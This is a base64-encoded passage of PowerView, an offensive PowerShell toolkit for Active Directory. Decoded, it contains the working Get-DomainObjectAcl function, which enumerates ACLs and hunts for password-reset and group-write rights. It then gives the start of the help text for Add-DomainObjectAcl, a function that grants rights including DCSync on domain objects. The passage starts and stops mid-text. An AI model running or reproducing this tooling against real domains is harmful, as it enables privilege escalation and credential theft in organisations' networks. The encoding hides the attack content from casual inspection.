ZXZhbnQgR1VJRHMgdG8gdGhlaXIgZGlzcGxheSBuYW1lcy4KCi5FWEFNUExFCgpHZXQtRG9tYWluT1UgfCBHZXQtRG9tYWluT2JqZWN0QWNsIC1SZXNvbHZlR1VJRHMKCkVudW1lcmF0ZSB0aGUgQUNMIHBlcm1pc3Npb25zIGZvciBhbGwgT1VzIGluIHRoZSBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbk9VIHwgR2V0LURvbWFpbk9iamVjdEFjbCAtUmVzb2x2ZUdVSURzIC1TYWNsCgpFbnVtZXJhdGUgdGhlIFNBQ0xzIGZvciBhbGwgT1VzIGluIHRoZSBkb21haW4sIHJlc29sdmluZyBHVUlEcy4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluT2JqZWN0QWNsIC1DcmVkZW50aWFsICRDcmVkIC1SZXNvbHZlR1VJRHMKCi5PVVRQVVRTCgpQb3dlclZpZXcuQUNMCgpDdXN0b20gUFNPYmplY3Qgd2l0aCBBQ0wgZW50cmllcy4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5BQ0wnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2FjbCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmVzb2x2ZUdVSURzLAoKICAgICAgICBbU3RyaW5nXQogICAgICAgIFtBbGlhcygnUmlnaHRzJyldCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdBbGwnLCAnUmVzZXRQYXNzd29yZCcsICdXcml0ZU1lbWJlcnMnKV0KICAgICAgICAkUmlnaHRzRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ3NhbWFjY291bnRuYW1lLG50c2VjdXJpdHlkZXNjcmlwdG9yLGRpc3Rpbmd1aXNoZWRuYW1lLG9iamVjdHNpZCcKICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NhY2wnXSkgewogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICdTYWNsJwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAnRGFjbCcKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCgogICAgICAgICREb21haW5HVUlETWFwQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJERvbWFpbkdVSURNYXBBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJERvbWFpbkdVSURNYXBBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkRG9tYWluR1VJRE1hcEFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJERvbWFpbkdVSURNYXBBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICREb21haW5HVUlETWFwQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgICMgZ2V0IGEgR1VJRCAtPiBuYW1lIG1hcHBpbmcKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXNvbHZlR1VJRHMnXSkgewogICAgICAgICAgICAkR1VJRHMgPSBHZXQtRG9tYWluR1VJRE1hcCBARG9tYWluR1VJRE1hcEFyZ3VtZW50cwogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeUy0xLS4qJykgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXihDTnxPVXxEQyk9LionKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIGEgLURvbWFpbiBpc24ndCBleHBsaWNpdGx5IHNldCwgZXh0cmFjdCB0aGUgb2JqZWN0IGRvbWFpbiBvdXQgb2YgdGhlIGRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICMgICBhbmQgcmVidWlsZCB0aGUgZG9tYWluIHNlYXJjaGVyCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eURvbWFpbiA9ICRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbk9iamVjdEFjbF0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkSWRlbnRpdHlEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkU2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluT2JqZWN0QWNsXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWluJyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UgLWltYXRjaCAnXlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JCcpIHsKICAgICAgICAgICAgICAgICAgICAkR3VpZEJ5dGVTdHJpbmcgPSAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyAnXCcgKyAkXy5Ub1N0cmluZygnWDInKSB9KSAtam9pbiAnJwogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UuQ29udGFpbnMoJy4nKSkgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRuc2hvc3RuYW1lPSRJZGVudGl0eUluc3RhbmNlKSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIih8KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKShuYW1lPSRJZGVudGl0eUluc3RhbmNlKShkaXNwbGF5bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT2JqZWN0QWNsXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIiRMREFQRmlsdGVyIgogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoJEZpbHRlcikgewogICAgICAgICAgICAgICAgJFNlYXJjaGVyLmZpbHRlciA9ICIoJiRGaWx0ZXIpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluT2JqZWN0QWNsXSBHZXQtRG9tYWluT2JqZWN0QWNsIGZpbHRlciBzdHJpbmc6ICQoJFNlYXJjaGVyLmZpbHRlcikiCgogICAgICAgICAgICAkUmVzdWx0cyA9ICRTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRPYmplY3QgPSAkXy5Qcm9wZXJ0aWVzCgogICAgICAgICAgICAgICAgaWYgKCRPYmplY3Qub2JqZWN0c2lkIC1hbmQgJE9iamVjdC5vYmplY3RzaWRbMF0pIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2lkID0gKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJE9iamVjdC5vYmplY3RzaWRbMF0sMCkpLlZhbHVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0U2lkID0gJE51bGwKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SYXdTZWN1cml0eURlc2NyaXB0b3IgLUFyZ3VtZW50TGlzdCAkT2JqZWN0WydudHNlY3VyaXR5ZGVzY3JpcHRvciddWzBdLCAwIHwgRm9yRWFjaC1PYmplY3QgeyBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTYWNsJ10pIHskXy5TeXN0ZW1BY2x9IGVsc2UgeyRfLkRpc2NyZXRpb25hcnlBY2x9IH0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JpZ2h0c0ZpbHRlciddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3VpZEZpbHRlciA9IFN3aXRjaCAoJFJpZ2h0c0ZpbHRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdSZXNldFBhc3N3b3JkJyB7ICcwMDI5OTU3MC0yNDZkLTExZDAtYTc2OC0wMGFhMDA2ZTA1MjknIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnV3JpdGVNZW1iZXJzJyB7ICdiZjk2NzljMC0wZGU2LTExZDAtYTI4NS0wMGFhMDAzMDQ5ZTInIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZWZhdWx0IHsgJzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCcgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLk9iamVjdFR5cGUgLWVxICRHdWlkRmlsdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0RE4nICRPYmplY3QuZGlzdGluZ3Vpc2hlZG5hbWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXyB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdPYmplY3RTSUQnICRPYmplY3RTaWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkQ29udGludWUgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnT2JqZWN0RE4nICRPYmplY3QuZGlzdGluZ3Vpc2hlZG5hbWVbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ09iamVjdFNJRCcgJE9iamVjdFNpZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJENvbnRpbnVlID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRDb250aW51ZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnQWN0aXZlRGlyZWN0b3J5UmlnaHRzJyAoW0VudW1dOjpUb09iamVjdChbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeVJpZ2h0c10sICRfLkFjY2Vzc01hc2spKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHVUlEcykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgd2UncmUgcmVzb2x2aW5nIEdVSURzLCBtYXAgdGhlbSB0aGVtIHRvIHRoZSByZXNvbHZlZCBoYXNoIHRhYmxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFjbFByb3BlcnRpZXMgPSBAe30KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5wc29iamVjdC5wcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uTmFtZSAtbWF0Y2ggJ09iamVjdFR5cGV8SW5oZXJpdGVkT2JqZWN0VHlwZXxPYmplY3RBY2VUeXBlfEluaGVyaXRlZE9iamVjdEFjZVR5cGUnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBY2xQcm9wZXJ0aWVzWyRfLk5hbWVdID0gJEdVSURzWyRfLlZhbHVlLnRvU3RyaW5nKCldCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFjbFByb3BlcnRpZXNbJF8uTmFtZV0gPSAkXy5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEFjbFByb3BlcnRpZXNbJF8uTmFtZV0gPSAkXy5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRPYmplY3QgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJEFjbFByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkT3V0T2JqZWN0LlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5BQ0wnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXRPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5BQ0wnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5PYmplY3RBY2xdIEVycm9yOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEFkZC1Eb21haW5PYmplY3RBY2wgewo8IwouU1lOT1BTSVMKCkFkZHMgYW4gQUNMIGZvciBhIHNwZWNpZmljIGFjdGl2ZSBkaXJlY3Rvcnkgb2JqZWN0LgoKQWRtaW5TREhvbGRlciBBQ0wgYXBwcm9hY2ggZnJvbSBTZWFuIE1ldGNhbGYgKEBweXJvdGVrMyk6IGh0dHBzOi8vYWRzZWN1cml0eS5vcmcvP3A9MTkwNgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluT2JqZWN0ICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiBtb2RpZmllcyB0aGUgQUNML0FDRSBlbnRyaWVzIGZvciBhIGdpdmVuIEFjdGl2ZSBEaXJlY3RvcnkKdGFyZ2V0IG9iamVjdCBzcGVjaWZpZWQgYnkgLVRhcmdldElkZW50aXR5LiBBdmFpbGFibGUgLVJpZ2h0cyBhcmUKJ0FsbCcsICdSZXNldFBhc3N3b3JkJywgJ1dyaXRlTWVtYmVycycsICdEQ1N5bmMnLCBvciBhIG1hbnVhbCBleHRlbmRlZApyaWdodHMgR1VJRCBjYW4gYmUgc2V0IHdpdGggLVJpZ2h0c0dVSUQuIFRoZXNlIHJpZ2h0cyBhcmUgZ3JhbnRlZCBvbiB0aGUgdGFyZ2V0Cm9iamVjdCBmb3IgdGhlIHNwZWNpZmllZCAtUHJpbmNpcGFsSWRlbnRpdHkuCgouUEFSQU1FVEVSIFRhcmdldElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpCmZvciB0aGUgZG9tYWluIG9iamVjdCB0byBtb2RpZnkgQUNMcyBmb3IuIFJlcXVpcmVkLiBXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFRhcmdldERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gZm9yIHRoZSBUYXJnZXRJZGVudGl0eSB0byB1c2UgZm9yIHRoZSBtb2RpZmljYXRpb24sIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgVGFyZ2V0TERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3QgdGFyZ2V0cy4KCi5QQVJBTUVURVIgVGFyZ2V0U2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciB0YXJnZXRzLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgUHJpbmNpcGFsSWRlbnRpdHkKCkEgU2FtQWNjb3VudE5hbWUgKGUuZy4gaGFybWoweSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWhhcm1qMHksQ049VXNlcnMsREM9dGVzdGxhYixEQz1sb2NhbCksClNJRCAoZS5nLiBTLTEtNS0yMS04OTAxNzE4NTktMzQzMzgwOTI3OS0zMzY2MTk2NzUzLTExMDgpLCBvciBHVUlEIChlLmcuIDRjNDM1ZGQ3LWRjNTgtNGIxNC05YTVlLTFmZGIwZTgwZDIwMSkKZm9yIHRoZSBkb21haW4gcHJpbmNpcGFsIHRvIGFkZCBmb3IgdGhlIEFDTC4gUmVxdWlyZWQuIFdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgUHJpbmNpcGFsRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiBmb3IgdGhlIFRhcmdldElkZW50aXR5IHRvIHVzZSBmb3IgdGhlIHByaW5jaXBhbCwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFN